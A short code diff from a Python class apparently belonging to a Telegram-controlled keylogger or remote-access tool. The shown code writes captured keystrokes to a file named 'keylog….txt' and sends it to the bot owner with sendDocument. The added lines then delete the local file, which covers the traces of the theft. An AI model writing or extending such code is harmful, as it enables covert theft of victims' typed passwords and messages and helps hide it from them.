@@ -1562,6 +1562,8 @@ class PeppinoTelegram:
             fo.write(buffer)
         with open(filename, "r") as fi:
             self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",fi))
+        if isfile(filename):
+            remove(filename)
         loading_bar.fill_and_delete()
 
     def leftclick(self) -> None:
